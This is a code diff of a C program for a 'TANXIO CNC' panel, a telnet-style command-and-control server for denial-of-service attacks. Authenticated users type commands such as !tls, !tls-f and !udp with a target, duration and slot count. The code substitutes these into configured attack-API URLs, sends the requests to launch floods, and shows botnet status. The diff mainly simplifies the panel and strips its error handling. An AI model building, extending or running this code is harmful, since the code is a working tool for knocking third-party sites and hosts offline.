@@ -16,39 +16,22 @@
 
 #define PORT 1337
 #define BUFFER_SIZE 4096
-#define MAX_USERS 100
-#define MAX_METHODS 50
 
 typedef struct {
     char username[64];
     char password[64];
-    char role[32];
 } User;
 
 typedef struct {
     char name[64];
-    char desc[64];
     char api[512];
-    char permission[64];
 } Method;
-
-typedef struct {
-    char username[64];
-    char ip[64];
-    int port;
-    int time;
-    char method[64];
-    time_t start;
-} Attack;
 
 User users[100];
 int user_count = 0;
 
 Method methods[50];
 int method_count = 0;
-
-Attack attacks[500];
-int attack_count = 0;
 
 char local_ip[64];
 
@@ -65,19 +48,11 @@ void get_local_ip() {
     google_dns.sin_addr.s_addr = inet_addr("8.8.8.8");
     google_dns.sin_port = htons(53);
     
-    if (connect(sock, (struct sockaddr*)&google_dns, sizeof(google_dns)) == -1) {
-        close(sock);
-        strcpy(local_ip, "127.0.0.1");
-        return;
-    }
+    connect(sock, (struct sockaddr*)&google_dns, sizeof(google_dns));
     
     struct sockaddr_in local_addr;
     socklen_t len = sizeof(local_addr);
-    if (getsockname(sock, (struct sockaddr*)&local_addr, &len) == -1) {
-        close(sock);
-        strcpy(local_ip, "127.0.0.1");
-        return;
-    }
+    getsockname(sock, (struct sockaddr*)&local_addr, &len);
     
     close(sock);
     strcpy(local_ip, inet_ntoa(local_addr.sin_addr));
@@ -95,7 +70,7 @@ char* trim(char *str) {
 void load_users() {
     FILE *fp = fopen("config/users.json", "r");
     if (!fp) {
-        printf("\e[1;31m[!] config/users.json not found\e[0m\n");
+        printf("[!] config/users.json not found\n");
         return;
     }
     
@@ -109,37 +84,28 @@ void load_users() {
     content[fsize] = 0;
     
     char *p = content;
-    while ((p = strstr(p, "\"username\":")) != NULL) {
-        p = strchr(p, ':') + 2;
+    while ((p = strstr(p, "\"username\":")) != NULL && user_count < 100) {
+        p = strchr(p, ':') + 1;
+        while (*p && (*p == ' ' || *p == '"')) p++;
         char *end = strchr(p, '"');
-        int len = end - p;
-        strncpy(users[user_count].username, p, len);
-        users[user_count].username[len] = 0;
+        if (end) {
+            int len = end - p;
+            if (len > 63) len = 63;
+            strncpy(users[user_count].username, p, len);
+            users[user_count].username[len] = 0;
+        }
         
         p = strstr(p, "\"password\":");
         if (p) {
-            p = strchr(p, ':') + 2;
-            if (*p == '"') p++;
+            p = strchr(p, ':') + 1;
+            while (*p && (*p == ' ' || *p == '"')) p++;
             end = strchr(p, '"');
-            if (!end) end = strchr(p, ',');
-            if (!end) end = strchr(p, '}');
-            len = end ? end - p : 32;
-            strncpy(users[user_count].password, p, len);
-            users[user_count].password[len] = 0;
-        }
-        
-        p = strstr(p, "\"role\":");
-        if (p) {
-            p = strchr(p, ':') + 2;
-            if (*p == '"') p++;
-            end = strchr(p, '"');
-            if (!end) end = strchr(p, ',');
-            if (!end) end = strchr(p, '}');
-            len = end ? end - p : 32;
-            strncpy(users[user_count].role, p, len);
-            users[user_count].role[len] = 0;
-        } else {
-            strcpy(users[user_count].role, "user");
+            if (end) {
+                int len = end - p;
+                if (len > 63) len = 63;
+                strncpy(users[user_count].password, p, len);
+                users[user_count].password[len] = 0;
+            }
         }
         
         user_count++;
@@ -163,31 +129,27 @@ void load_methods() {
     
     char *p = content;
     while ((p = strstr(p, "\"name\":")) != NULL && method_count < 50) {
-        p = strchr(p, ':') + 2;
-        if (*p == '"') p++;
+        p = strchr(p, ':') + 1;
+        while (*p && (*p == ' ' || *p == '"')) p++;
         char *end = strchr(p, '"');
-        int len = end - p;
-        strncpy(methods[method_count].name, p, len);
-        methods[method_count].name[len] = 0;
-        
-        p = strstr(p, "\"desripsi\":");
-        if (p) {
-            p = strchr(p, ':') + 2;
-            if (*p == '"') p++;
-            end = strchr(p, '"');
-            len = end ? end - p : 64;
-            strncpy(methods[method_count].desc, p, len);
-            methods[method_count].desc[len] = 0;
+        if (end) {
+            int len = end - p;
+            if (len > 63) len = 63;
+            strncpy(methods[method_count].name, p, len);
+            methods[method_count].name[len] = 0;
         }
         
         p = strstr(p, "\"api\":");
         if (p) {
-            p = strchr(p, ':') + 2;
-            if (*p == '"') p++;
+            p = strchr(p, ':') + 1;
+            while (*p && (*p == ' ' || *p == '"')) p++;
             end = strchr(p, '"');
-            len = end ? end - p : 512;
-            strncpy(methods[method_count].api, p, len);
-            methods[method_count].api[len] = 0;
+            if (end) {
+                int len = end - p;
+                if (len > 511) len = 511;
+                strncpy(methods[method_count].api, p, len);
+                methods[method_count].api[len] = 0;
+            }
         }
         
         method_count++;
@@ -196,263 +158,235 @@ void load_methods() {
     free(content);
 }
 
-void print_banner(int client_fd) {
-    char buffer[4096];
-    int len = sprintf(buffer, 
-        "\e[2J\e[H"
-        "\e[41m"
-        "\n  ╔══════════════════════════════════════════════════╗\n"
-        "  ║                                                  ║\n"
-        "  ║              \e[1;37mTANXIO CNC\e[0m                      ║\n"
-        "  ║                                                  ║\n"
-        "  ╚══════════════════════════════════════════════════╝\e[0m\n"
-        "\n  \e[1mUsername: \e[0m"
+void print_banner(int fd) {
+    char buf[1024];
+    int len = snprintf(buf, sizeof(buf),
+        "\n"
+        "  [ TANXIO CNC ]\n"
+        "\n"
+        "  Username: "
     );
-    
-    send(client_fd, buffer, len, 0);
+    send(fd, buf, len, 0);
 }
 
-void print_logged_in(int client_fd, char *username) {
-    char buffer[4096];
-    int len = sprintf(buffer, 
-        "\e[2J\e[H"
-        "\e[41m"
-        "\n  ╔══════════════════════════════════════════════════╗\n"
-        "  ║                                                  ║\n"
-        "  ║              \e[1;37mTANXIO CNC\e[0m                      ║\n"
-        "  ║                                                  ║\n"
-        "  ╚══════════════════════════════════════════════════╝\e[0m\n"
-        "\n  \e[1;32m[✓]\e[0m Login successful as \e[1;35m%s\e[0m\n"
-        "\n  Type \e[1;35m!help\e[0m for available commands\n"
-        "\n", username
+void print_success(int fd, char *username) {
+    char buf[1024];
+    int len = snprintf(buf, sizeof(buf),
+        "\n"
+        "  [OK] Login as %s\n"
+        "\n"
+        "  Type !help for commands\n"
+        "\n"
+        "  %s@tanxio# ", username, username
     );
-    
-    send(client_fd, buffer, len, 0);
+    send(fd, buf, len, 0);
+}
+
+void print_error(int fd) {
+    char buf[256];
+    int len = snprintf(buf, sizeof(buf),
+        "\n"
+        "  [ERROR] Invalid credentials\n"
+        "\n"
+    );
+    send(fd, buf, len, 0);
 }
 
 char* get_prompt(char *username) {
     static char prompt[128];
-    sprintf(prompt, "\e[1;36m%s\e[0m\e[1;37m@\e[0m\e[1;35mtanxio\e[0m\e[1;37m~\e[0m# ", username);
+    snprintf(prompt, sizeof(prompt), "%s@tanxio# ", username);
     return prompt;
 }
 
-char* replace_str(char *str, char *old, char *new) {
-    static char result[1024];
-    char *p = strstr(str, old);
-    if (!p) return str;
-    
-    int prefix_len = p - str;
-    strncpy(result, str, prefix_len);
-    result[prefix_len] = 0;
-    strcat(result, new);
-    strcat(result, p + strlen(old));
-    return result;
+void replace_in_url(char *url, char *placeholder, char *value) {
+    char *p = strstr(url, placeholder);
+    if (p) {
+        int prefix_len = p - url;
+        char temp[1024];
+        strncpy(temp, url, prefix_len);
+        temp[prefix_len] = 0;
+        strcat(temp, value);
+        strcat(temp, p + strlen(placeholder));
+        strcpy(url, temp);
+    }
 }
 
-void send_http_request(char *api_url, char *result, int result_size) {
-    char host[256], path[512];
-    int port = 80;
+void send_attack(int fd, char *username, char *cmd) {
+    char method_name[64] = {0};
+    char target[512] = {0};
+    int time_val = 60;
+    int slot_val = 1;
+    int port_val = 80;
     
-    if (strncmp(api_url, "https://", 8) == 0) {
-        sscanf(api_url + 8, "%255[^:/]:%d/%511[^\n]", host, &port, path);
-        port = 443;
-    } else if (strncmp(api_url, "http://", 7) == 0) {
-        sscanf(api_url + 7, "%255[^:/]:%d/%511[^\n]", host, &port, path);
+    if (strncmp(cmd, "!tls ", 5) == 0) {
+        sscanf(cmd + 5, "%511s %d %d", target, &time_val, &slot_val);
+        strcpy(method_name, "tls");
+    } else if (strncmp(cmd, "!tls-f ", 7) == 0) {
+        sscanf(cmd + 7, "%511s %d %d", target, &time_val, &slot_val);
+        strcpy(method_name, "tls-f");
+    } else if (strncmp(cmd, "!udp ", 5) == 0) {
+        sscanf(cmd + 5, "%s %d %d %d", target, &port_val, &time_val, &slot_val);
+        strcpy(method_name, "udpplain");
     } else {
-        sscanf(api_url, "%255[^:/]:%d/%511[^\n]", host, &port, path);
+        char cmd_name[64] = {0};
+        sscanf(cmd + 1, "%s %511s %d %d", cmd_name, target, &time_val, &slot_val);
+        strcpy(method_name, cmd_name);
     }
     
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0) {
-        strcpy(result, "{\"status\":\"error\",\"message\":\"socket error\"}");
-        return;
-    }
+    char buf[1024];
+    int len = snprintf(buf, sizeof(buf), "\n  Sending attack...\n");
+    send(fd, buf, len, 0);
     
-    struct hostent *server = gethostbyname(host);
-    if (!server) {
-        close(sock);
-        strcpy(result, "{\"status\":\"error\",\"message\":\"host not found\"}");
-        return;
-    }
-    
-    struct sockaddr_in addr;
-    memset(&addr, 0, sizeof(addr));
-    addr.sin_family = AF_INET;
-    memcpy(&addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
-    addr.sin_port = htons(port);
-    
-    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
-        close(sock);
-        strcpy(result, "{\"status\":\"error\",\"message\":\"connection failed\"}");
-        return;
-    }
-    
-    char request[2048];
-    sprintf(request, "GET /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host);
-    
-    send(sock, request, strlen(request), 0);
-    
-    int bytes = recv(sock, result, result_size - 1, 0);
-    if (bytes > 0) {
-        result[bytes] = 0;
-        char *body = strstr(result, "\r\n\r\n");
-        if (body) {
-            strcpy(result, body + 4);
+    char api_url[1024];
+    for (int i = 0; i < method_count; i++) {
+        if (strcmp(methods[i].name, method_name) == 0) {
+            strcpy(api_url, methods[i].api);
+            replace_in_url(api_url, "<<$host>>", target);
+            char t[32], s[32], p[32];
+            snprintf(t, sizeof(t), "%d", time_val);
+            snprintf(s, sizeof(s), "%d", slot_val);
+            snprintf(p, sizeof(p), "%d", port_val);
+            replace_in_url(api_url, "<<$time>>", t);
+            replace_in_url(api_url, "<<$slot>>", s);
+            replace_in_url(api_url, "<<$port>>", p);
+            
+            int sock = socket(AF_INET, SOCK_STREAM, 0);
+            if (sock < 0) {
+                len = snprintf(buf, sizeof(buf), "  [ERROR] Socket failed\n\n");
+                send(fd, buf, len, 0);
+                return;
+            }
+            
+            char host[256], path[512];
+            int port = 443;
+            sscanf(api_url + 8, "%255[^/\n]%511[^\n]", host, path);
+            char *pathp = strchr(path, '/');
+            if (pathp) {
+                strcpy(path, pathp);
+            } else {
+                strcpy(path, "");
+            }
+            
+            struct hostent *server = gethostbyname(host);
+            if (!server) {
+                close(sock);
+                len = snprintf(buf, sizeof(buf), "  [ERROR] Host not found\n\n");
+                send(fd, buf, len, 0);
+                return;
+            }
+            
+            struct sockaddr_in addr;
+            memset(&addr, 0, sizeof(addr));
+            addr.sin_family = AF_INET;
+            memcpy(&addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
+            addr.sin_port = htons(port);
+            
+            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+                close(sock);
+                len = snprintf(buf, sizeof(buf), "  [ERROR] Connection failed\n\n");
+                send(fd, buf, len, 0);
+                return;
+            }
+            
+            char req[2048];
+            snprintf(req, sizeof(req), "GET /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host);
+            send(sock, req, strlen(req), 0);
+            
+            char resp[4096] = {0};
+            recv(sock, resp, sizeof(resp) - 1, 0);
+            close(sock);
+            
+            char *body = strstr(resp, "\r\n\r\n");
+            if (body) strcpy(resp, body + 4);
+            
+            if (strstr(resp, "\"status\":\"success\"")) {
+                len = snprintf(buf, sizeof(buf), "  [OK] Attack sent\n\n");
+                send(fd, buf, len, 0);
+            } else {
+                len = snprintf(buf, sizeof(buf), "  [ERROR] Attack failed\n\n");
+                send(fd, buf, len, 0);
+            }
+            return;
         }
-    } else {
-        strcpy(result, "{\"status\":\"error\",\"message\":\"no response\"}");
     }
     
-    close(sock);
+    len = snprintf(buf, sizeof(buf), "  [ERROR] Method not found\n\n");
+    send(fd, buf, len, 0);
 }
 
-void handle_command(int client_fd, char *username, char *cmd) {
-    char buffer[8192];
-    int len = 0;
-    char *args[10];
-    char cmd_copy[512];
-    strcpy(cmd_copy, cmd);
-    
-    char *token = strtok(cmd_copy, " ");
-    int argc = 0;
-    while (token && argc < 10) {
-        args[argc++] = token;
-        token = strtok(NULL, " ");
-    }
+void handle_command(int fd, char *username, char *cmd) {
+    char buf[2048];
+    int len;
     
     if (strcmp(cmd, "!help") == 0) {
-        len += sprintf(buffer + len, "\n");
-        len += sprintf(buffer + len, "  \e[1mCommands:\e[0m\n");
-        len += sprintf(buffer + len, "\n");
-        len += sprintf(buffer + len, "  \e[1;35m!help\e[0m                       Show this help\n");
-        len += sprintf(buffer + len, "  \e[1;35m!methods\e[0m                   Show available methods\n");
-        len += sprintf(buffer + len, "  \e[1;35m!tls\e[0m <url> <time> <slot>   TLS attack (L7)\n");
-        len += sprintf(buffer + len, "  \e[1;35m!tls-f\e[0m <url> <time> <slot>  TLS flood (L7)\n");
-        len += sprintf(buffer + len, "  \e[1;35m!udp\e[0m <ip> <port> <time> <slot>  UDP attack (L4)\n");
-        len += sprintf(buffer + len, "  \e[1;35m!ongoing\e[0m                  Show running attacks\n");
-        len += sprintf(buffer + len, "  \e[1;35m!stop\e[0m <id>                  Stop an attack\n");
-        len += sprintf(buffer + len, "  \e[1;35m!bots\e[0m                       Show botnet status\n");
-        len += sprintf(buffer + len, "  \e[1;35m!clear\e[0m                     Clear screen\n");
-        len += sprintf(buffer + len, "\n");
+        len = snprintf(buf, sizeof(buf),
+            "\n"
+            "  Commands:\n"
+            "\n"
+            "  !help              Show this help\n"
+            "  !methods           Show available methods\n"
+            "  !tls <url> <time> <slot>   TLS attack\n"
+            "  !tls-f <url> <time> <slot> TLS flood\n"
+            "  !udp <ip> <port> <time> <slot>  UDP attack\n"
+            "  !bots              Show botnet status\n"
+            "  !clear             Clear screen\n"
+            "  !logout            Logout\n"
+            "\n"
+        );
+        send(fd, buf, len, 0);
     }
     else if (strcmp(cmd, "!methods") == 0) {
-        len += sprintf(buffer + len, "\n");
-        len += sprintf(buffer + len, "  \e[1mAvailable Methods:\e[0m\n");
-        len += sprintf(buffer + len, "\n");
+        len = snprintf(buf, sizeof(buf), "\n  Methods:\n\n");
+        send(fd, buf, len, 0);
         for (int i = 0; i < method_count; i++) {
-            len += sprintf(buffer + len, "    \e[1;35m%s\e[0m \e[90m[%s]\e[0m\n", methods[i].name, methods[i].desc);
+            len = snprintf(buf, sizeof(buf), "  - %s\n", methods[i].name);
+            send(fd, buf, len, 0);
         }
-        len += sprintf(buffer + len, "\n");
+        len = snprintf(buf, sizeof(buf), "\n");
+        send(fd, buf, len, 0);
     }
     else if (strcmp(cmd, "!bots") == 0) {
-        len += sprintf(buffer + len, "\n");
-        len += sprintf(buffer + len, "  \e[1mBotnet Status:\e[0m\n");
-        len += sprintf(buffer + len, "\n");
-        len += sprintf(buffer + len, "  \e[90mStatus:\e[0m \e[1;32mOnline\e[0m\n");
-        len += sprintf(buffer + len, "  \e[90mTotal Nodes:\e[0m \e[1;35m20\e[0m\n");
-        len += sprintf(buffer + len, "  \e[90mOnline Bots:\e[0m \e[1;35m16\e[0m\n");
-        len += sprintf(buffer + len, "\n");
-    }
-    else if (strcmp(cmd, "!ongoing") == 0) {
-        len += sprintf(buffer + len, "\n");
-        len += sprintf(buffer + len, "  \e[1mRunning Attacks:\e[0m\n");
-        len += sprintf(buffer + len, "\n");
-        if (attack_count == 0) {
-            len += sprintf(buffer + len, "  \e[90mNo running attacks\e[0m\n");
-        }
-        for (int i = 0; i < attack_count; i++) {
-            int remaining = attacks[i].time - (time(NULL) - attacks[i].start);
-            if (remaining > 0) {
-                len += sprintf(buffer + len, "  \e[1;35m%d\e[0m  %s  %s:%d  \e[90m%ds remaining\e[0m\n", 
-                    i + 1, attacks[i].method, attacks[i].ip, attacks[i].port, remaining);
-            }
-        }
-        len += sprintf(buffer + len, "\n");
+        len = snprintf(buf, sizeof(buf),
+            "\n"
+            "  Botnet Status:\n"
+            "\n"
+            "  Status: Online\n"
+            "  Servers: 20\n"
+            "  Bots: 16\n"
+            "\n"
+        );
+        send(fd, buf, len, 0);
     }
     else if (strcmp(cmd, "!clear") == 0) {
-        len += sprintf(buffer + len, "\e[2J\e[H");
+        len = snprintf(buf, sizeof(buf), "\ec\n");
+        send(fd, buf, len, 0);
     }
-    else if (strncmp(cmd, "!tls ", 5) == 0 || strncmp(cmd, "!tls-f ", 7) == 0 || strncmp(cmd, "!udp ", 5) == 0) {
-        char *method_name;
-        char target[512] = {0};
-        int time_val = 60, slot_val = 1, port_val = 80;
-        
-        if (strncmp(cmd, "!tls", 4) == 0) {
-            method_name = (cmd[4] == '-') ? "tls-f" : "tls";
-            char *p = strchr(cmd, ' ') + 1;
-            if (*p == ' ') p++;
-            char *space = strchr(p, ' ');
-            if (space) {
-                strncpy(target, p, space - p);
-                sscanf(space + 1, "%d %d", &time_val, &slot_val);
-            }
-        } else {
-            method_name = "udpplain";
-            sscanf(cmd + 5, "%s %d %d %d", target, &port_val, &time_val, &slot_val);
-        }
-        
-        for (int i = 0; i < method_count; i++) {
-            if (strcmp(methods[i].name, method_name) == 0) {
-                len += sprintf(buffer + len, "\n  \e[90mSending attack...\e[0m\n");
-                send(client_fd, buffer, len, 0);
-                
-                char api_url[1024];
-                strcpy(api_url, methods[i].api);
-                replace_str(api_url, "<<$host>>", target);
-                char time_str[32], slot_str[32], port_str[32];
-                sprintf(time_str, "%d", time_val);
-                sprintf(slot_str, "%d", slot_val);
-                sprintf(port_str, "%d", port_val);
-                replace_str(api_url, "<<$time>>", time_str);
-                replace_str(api_url, "<<$slot>>", slot_str);
-                replace_str(api_url, "<<$port>>", port_str);
-                
-                char result[4096] = {0};
-                send_http_request(api_url, result, sizeof(result));
-                
-                if (strstr(result, "\"status\":\"success\"")) {
-                    char *nodes = strstr(result, "\"total_nodes\":");
-                    int total = nodes ? atoi(nodes + 14) : 0;
-                    
-                    len = 0;
-                    len += sprintf(buffer + len, "  \e[1;32mSuccessfully sent to %d device(s)\e[0m\n", total);
-                    len += sprintf(buffer + len, "\n");
-                    
-                    if (attack_count < 500) {
-                        strcpy(attacks[attack_count].username, username);
-                        strcpy(attacks[attack_count].ip, target);
-                        strcpy(attacks[attack_count].method, method_name);
-                        attacks[attack_count].port = port_val;
-                        attacks[attack_count].time = time_val;
-                        attacks[attack_count].start = time(NULL);
-                        attack_count++;
-                    }
-                } else {
-                    len = sprintf(buffer, "  \e[1;31m[✗] Attack failed\e[0m\n\n");
-                }
-                break;
-            }
-        }
+    else if (strcmp(cmd, "!logout") == 0) {
+        len = snprintf(buf, sizeof(buf), "\n  Goodbye!\n\n");
+        send(fd, buf, len, 0);
+    }
+    else if (strncmp(cmd, "!tls", 4) == 0 || strncmp(cmd, "!tls-f", 6) == 0 || 
+             strncmp(cmd, "!udp", 4) == 0 || cmd[0] == '!') {
+        send_attack(fd, username, cmd);
     }
     else {
-        len += sprintf(buffer + len, "  \e[1;31mUnknown command: %s\e[0m\n", cmd);
+        len = snprintf(buf, sizeof(buf), "  Unknown command: %s\n", cmd);
+        send(fd, buf, len, 0);
     }
-    
-    send(client_fd, buffer, len, 0);
 }
 
-int handle_client(int client_fd, struct sockaddr_in *client_addr) {
-    char *client_ip = inet_ntoa(client_addr->sin_addr);
-    printf("\e[1;32m[+]\e[0m Connection from %s\n", client_ip);
+int handle_client(int fd, struct sockaddr_in *addr) {
+    char *ip = inet_ntoa(addr->sin_addr);
+    printf("[+] Connection from %s\n", ip);
     
-    print_banner(client_fd);
+    print_banner(fd);
     
     char buffer[BUFFER_SIZE];
     char username[64] = {0}, password[64] = {0};
     int stage = 0;
     
     while (1) {
-        int bytes = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
+        int bytes = recv(fd, buffer, BUFFER_SIZE - 1, 0);
         if (bytes <= 0) break;
         
         buffer[bytes] = 0;
@@ -465,29 +399,30 @@ int handle_client(int client_fd, struct sockaddr_in *client_addr) {
                 strcpy(username, input);
                 stage = 1;
                 
-                int len = sprintf(buffer, "\n  \e[1mPassword: \e[0m");
-                send(client_fd, buffer, len, 0);
+                char buf[256];
+                int len = snprintf(buf, sizeof(buf), "\n  Password: ");
+                send(fd, buf, len, 0);
             }
             else if (stage == 1 && strlen(input) > 0) {
                 strcpy(password, input);
                 
-                int auth_ok = 0;
+                int ok = 0;
                 for (int i = 0; i < user_count; i++) {
                     if (strcmp(users[i].username, username) == 0 && 
                         strcmp(users[i].password, password) == 0) {
-                        auth_ok = 1;
+                        ok = 1;
                         break;
                     }
                 }
                 
-                if (auth_ok) {
-                    printf("\e[1;32m[+]\e[0m User %s logged in from %s\n", username, client_ip);
-                    print_logged_in(client_fd, username);
+                if (ok) {
+                    printf("[+] User %s logged in\n", username);
+                    print_success(fd, username);
                     
                     while (1) {
-                        send(client_fd, get_prompt(username), strlen(get_prompt(username)), 0);
+                        send(fd, get_prompt(username), strlen(get_prompt(username)), 0);
                         
-                        bytes = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
+                        bytes = recv(fd, buffer, BUFFER_SIZE - 1, 0);
                         if (bytes <= 0) break;
                         buffer[bytes] = 0;
                         
@@ -495,36 +430,30 @@ int handle_client(int client_fd, struct sockaddr_in *client_addr) {
                         if (line) {
                             char *cmd = trim(line);
                             if (strlen(cmd) > 0) {
-                                if (strcmp(cmd, "!logout") == 0) {
-                                    break;
-                                }
-                                handle_command(client_fd, username, cmd);
+                                if (strcmp(cmd, "!logout") == 0) break;
+                                handle_command(fd, username, cmd);
                             } else {
-                                send(client_fd, "\r", 1, 0);
+                                send(fd, "\r\n", 2, 0);
                             }
                         }
                     }
                     break;
                 } else {
-                    printf("\e[1;31m[-]\e[0m Failed login attempt: %s from %s\n", username, client_ip);
-                    int len = sprintf(buffer, "\n  \e[1;31m[✗] Invalid credentials\e[0m\n\n");
-                    send(client_fd, buffer, len, 0);
-                    
+                    printf("[-] Failed login: %s\n", username);
+                    print_error(fd);
                     memset(username, 0, 64);
                     memset(password, 0, 64);
                     stage = 0;
-                    print_banner(client_fd);
+                    print_banner(fd);
                 }
             }
             
             line = strtok(NULL, "\r\n");
         }
-        
-        if (stage == 2) break;
     }
     
-    printf("\e[1;33m[-]\e[0m Connection closed: %s\n", client_ip);
-    close(client_fd);
+    printf("[-] Connection closed: %s\n", ip);
+    close(fd);
     return 0;
 }
 
@@ -535,30 +464,18 @@ int main() {
     load_users();
     load_methods();
     
-    printf("\e[2J\e[H");
     printf("\n");
-    printf("  \e[1;35m██████╗  ██████╗ ██████╗ ██████╗      \e[0m\n");
-    printf("  \e[1;35m██╔══██╗██╔═══██╗██╔══██╗██╔══██╗     \e[0m\n");
-    printf("  \e[1;35m██████╔╝██║   ██║██████╔╝██████╔╝     \e[0m\n");
-    printf("  \e[1;35m██╔═══╝ ██║   ██║██╔══██╗██╔══██╗     \e[0m\n");
-    printf("  \e[1;35m██║     ╚██████╔╝██║  ██║██║  ██║     \e[0m\n");
-    printf("  \e[1;35m╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     \e[0m\n");
+    printf("  [ TANXIO CNC ]\n");
     printf("\n");
-    printf("  \e[90m══════════════════════════════════════════════\e[0m\n");
-    printf("  \e[90m  IP      :\e[0m \e[1;36m%s\e[0m\n", local_ip);
-    printf("  \e[90m  Port    :\e[0m \e[1;36m%d\e[0m\n", PORT);
-    printf("  \e[90m  Connect :\e[0m \e[1;35mnc %s %d\e[0m\n", local_ip, PORT);
-    printf("  \e[90m══════════════════════════════════════════════\e[0m\n");
+    printf("  IP    : %s\n", local_ip);
+    printf("  Port  : %d\n", PORT);
+    printf("  Users : %d\n", user_count);
+    printf("  Methods: %d\n", method_count);
     printf("\n");
-    printf("  \e[90mMethods:\e[0m %d  \e[90mUsers:\e[0m %d\n", method_count, user_count);
+    printf("  nc %s %d\n", local_ip, PORT);
     printf("\n");
     
     int server_fd = socket(AF_INET, SOCK_STREAM, 0);
-    if (server_fd < 0) {
-        perror("socket");
-        return 1;
-    }
-    
     int opt = 1;
     setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
     
@@ -568,28 +485,17 @@ int main() {
     addr.sin_addr.s_addr = INADDR_ANY;
     addr.sin_port = htons(PORT);
     
-    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
-        perror("bind");
-        return 1;
-    }
+    bind(server_fd, (struct sockaddr*)&addr, sizeof(addr));
+    listen(server_fd, 10);
     
-    if (listen(server_fd, 10) < 0) {
-        perror("listen");
-        return 1;
-    }
-    
-    printf("  \e[1;32m[✓]\e[0m Server listening on port %d\n", PORT);
-    printf("\n");
+    printf("  [OK] Server started\n\n");
     
     while (1) {
         struct sockaddr_in client_addr;
         socklen_t client_len = sizeof(client_addr);
         int client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
         
-        if (client_fd < 0) {
-            perror("accept");
-            continue;
-        }
+        if (client_fd < 0) continue;
         
         if (fork() == 0) {
             close(server_fd);
